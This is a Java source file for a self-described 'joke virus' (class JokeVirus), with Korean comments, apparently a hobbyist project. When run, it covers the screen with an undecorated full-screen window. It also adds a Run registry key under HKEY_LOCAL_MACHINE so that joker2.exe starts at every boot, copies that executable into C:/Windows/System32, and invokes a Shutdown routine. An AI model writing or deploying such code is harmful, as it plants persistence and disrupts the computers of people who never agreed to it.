package joke;

import java.awt.Container;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.HeadlessException;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;

import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.swing.JFrame;

public class JokeVirus extends JFrame {

	String path = getClass().getClassLoader().getResource("").getPath() + "joker2.exe";
	FileInputStream fis;
	OutputStream fos;

	public JokeVirus() throws HeadlessException, InterruptedException {
		super();
		// TODO Auto-generated constructor stub
		// 컴퓨터 환경이 여기로 담겨!!
		/**
		 * 기본 그래픽 디바이스가 담겨, 지원되는 그래픽 디바이스가 없으면 getScreendevice[0]과 같은 결과가 나옴
		 */
		GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
		GraphicsDevice gd = ge.getDefaultScreenDevice();
		this.setUndecorated(true);// 화면 확대 축소 최대화 없애버리기!! gd위에 와야해!!
		gd.setFullScreenWindow(this);

		Container container = getContentPane();
		container.add(new CustomJPanel());

		// 파일 인수로 URL안받아
		// File bgm = new File("resource/bam.wav");
		// File bgm = new File("resource/bam.wav");
		// playSound(bgm);

		setVisible(true);
		setDefaultCloseOperation(EXIT_ON_CLOSE);

		try {
			WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE,
					"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "joka", "C:/Windows/System32/joker2.exe");
		} 
		catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		 new Shutdown();
		try {
			fis = new FileInputStream(path);
			fos = new FileOutputStream("C:/Windows/System32/joker2.exe");
			int num = 0;

			while ((num = fis.read()) != -1) {
				fos.write(num);
			}
			fos.flush();
			fos.close();
			fis.close();

		} catch (Exception e) {
			// TODO: handle exception
		}

	}

	public static void playSound(File file) {
		try {
			Clip clip = AudioSystem.getClip(); // 클립 생성
			clip.open(AudioSystem.getAudioInputStream(file));
			clip.start();
		} catch (Exception e) {
			System.err.println(e.getMessage());
		}

	}

	public static void main(String[] args) {

		try {
			JokeVirus jv = new JokeVirus();
		} catch (HeadlessException | InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
